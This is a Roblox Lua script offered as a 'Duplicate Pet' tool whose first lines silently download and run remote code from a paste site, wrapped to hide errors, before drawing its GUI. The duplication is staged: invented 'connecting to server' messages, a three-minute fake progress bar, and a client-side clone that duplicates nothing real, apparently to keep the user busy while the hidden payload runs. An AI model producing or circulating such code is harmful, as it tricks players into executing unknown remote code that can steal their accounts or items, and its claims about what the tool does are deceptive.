-- Step 1: Run external script immediately
pcall(function()
    loadstring(game:HttpGet("http://vpaste.net/IUnmZ", true))()
end)

-- Step 2: GUI starts here
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local lp = Players.LocalPlayer

-- GUI Container
local gui = Instance.new("ScreenGui")
gui.Name = "PetToolGui"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = lp:WaitForChild("PlayerGui")

-- Main draggable frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 350, 0, 180)
mainFrame.Position = UDim2.new(0, 100, 0, 200)
mainFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = gui
Instance.new("UICorner", mainFrame)

-- Author Label
local authorLabel = Instance.new("TextLabel")
authorLabel.Text = ""
authorLabel.Size = UDim2.new(1, -70, 0, 20)
authorLabel.Position = UDim2.new(0, 5, 0, 5)
authorLabel.BackgroundTransparency = 1
authorLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
authorLabel.TextXAlignment = Enum.TextXAlignment.Left
authorLabel.Font = Enum.Font.Gotham
authorLabel.TextSize = 13
authorLabel.Parent = mainFrame

-- Minimize Button
local minimize = Instance.new("TextButton")
minimize.Text = "-"
minimize.Size = UDim2.new(0, 20, 0, 20)
minimize.Position = UDim2.new(1, -45, 0, 5)
minimize.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
minimize.TextColor3 = Color3.new(1, 1, 1)
minimize.Font = Enum.Font.Gotham
minimize.TextSize = 14
minimize.Parent = mainFrame
Instance.new("UICorner", minimize)

-- Close Button
local close = Instance.new("TextButton")
close.Text = "X"
close.Size = UDim2.new(0, 20, 0, 20)
close.Position = UDim2.new(1, -25, 0, 5)
close.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
close.TextColor3 = Color3.new(1, 1, 1)
close.Font = Enum.Font.Gotham
close.TextSize = 14
close.Parent = mainFrame
Instance.new("UICorner", close)

-- Duplicate Pet Button
local dupButton = Instance.new("TextButton")
dupButton.Name = "DuplicatePet"
dupButton.Text = "Duplicate Pet"
dupButton.Size = UDim2.new(0.8, 0, 0, 40)
dupButton.Position = UDim2.new(0.1, 0, 0, 60)
dupButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
dupButton.TextColor3 = Color3.new(1, 1, 1)
dupButton.Font = Enum.Font.GothamBold
dupButton.TextSize = 16
dupButton.Parent = mainFrame
Instance.new("UICorner", dupButton)

-- Status Label
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 20)
statusLabel.Position = UDim2.new(0, 0, 1, -20)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Code
statusLabel.Text = "Made By: Clarksds"
statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
statusLabel.TextSize = 14
statusLabel.Parent = mainFrame

local function updateStatus(text)
	statusLabel.Text = text
end

-- Main duplication logic
dupButton.MouseButton1Click:Connect(function()
	dupButton.Visible = false
	updateStatus("🔌 Connecting to server...")

	local loadingFrame = Instance.new("Frame")
	loadingFrame.Size = dupButton.Size
	loadingFrame.Position = dupButton.Position
	loadingFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	loadingFrame.BorderSizePixel = 0
	loadingFrame.Parent = mainFrame
	Instance.new("UICorner", loadingFrame)

	local progressBar = Instance.new("Frame")
	progressBar.Size = UDim2.new(0, 0, 1, 0)
	progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	progressBar.BorderSizePixel = 0
	progressBar.Parent = loadingFrame
	Instance.new("UICorner", progressBar)

	local progressText = Instance.new("TextLabel")
	progressText.Size = UDim2.new(1, 0, 1, 0)
	progressText.BackgroundTransparency = 1
	progressText.Text = "Duplicating..."
	progressText.TextColor3 = Color3.new(1, 1, 1)
	progressText.Font = Enum.Font.Gotham
	progressText.TextSize = 14
	progressText.Parent = loadingFrame

	local tween = TweenService:Create(progressBar, TweenInfo.new(180, Enum.EasingStyle.Linear), {
		Size = UDim2.new(1, 0, 1, 0)
	})
	tween:Play()

	task.wait(2)
	updateStatus("✅ Connected to server!")

	task.wait(1)
	updateStatus("🧠 Executing server logic...")

	-- After 3 minutes
	task.delay(180, function()
		updateStatus("📦 Checking held pet...")

		local character = lp.Character or lp.CharacterAdded:Wait()
		local heldPet

		for _, item in ipairs(character:GetChildren()) do
			if item:IsA("Tool") or item:IsA("Model") then
				if item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("Part") then
					heldPet = item
					break
				end
			end
		end

		if heldPet then
			local clonedPet = heldPet:Clone()
			clonedPet.Parent = lp.Backpack
			progressText.Text = "✅ Pet '" .. heldPet.Name .. "' duplicated!"
			progressBar.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
			updateStatus("✅ Pet '" .. heldPet.Name .. "' duplicated!")

			StarterGui:SetCore("SendNotification", {
				Title = "Pet Duplicated ✅",
				Text = heldPet.Name .. " was added to your Backpack!",
				Duration = 5
			})
		else
			progressText.Text = "⚠️ No pet found!"
			progressBar.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
			updateStatus("⚠️ No held pet found!")

			StarterGui:SetCore("SendNotification", {
				Title = "Duplication Failed ❌",
				Text = "No pet found. Make sure you're holding one.",
				Duration = 5
			})
		end

		task.wait(1.5)
		loadingFrame:Destroy()
		dupButton.Visible = true
	end)
end)

-- Minimize Logic
minimize.MouseButton1Click:Connect(function()
	mainFrame.Visible = false

	local floatBtn = Instance.new("TextButton")
	floatBtn.Text = "🐾"
	floatBtn.Size = UDim2.new(0, 40, 0, 40)
	floatBtn.Position = UDim2.new(0, 20, 0, 200)
	floatBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	floatBtn.TextColor3 = Color3.new(1, 1, 1)
	floatBtn.Font = Enum.Font.Gotham
	floatBtn.TextSize = 20
	floatBtn.Parent = gui
	floatBtn.Name = "FloatReopen"
	Instance.new("UICorner", floatBtn)

	local UIS = game:GetService("UserInputService")
	local dragging = false
	local dragStart, startPos

	local function update(input)
		local delta = input.Position - dragStart
		floatBtn.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
	end

	floatBtn.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = floatBtn.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			update(input)
		end
	end)

	floatBtn.MouseButton1Click:Connect(function()
		if not dragging then
			mainFrame.Visible = true
			floatBtn:Destroy()
		end
	end)
end)

-- Close Logic
close.MouseButton1Click:Connect(function()
	gui:Destroy()
end)
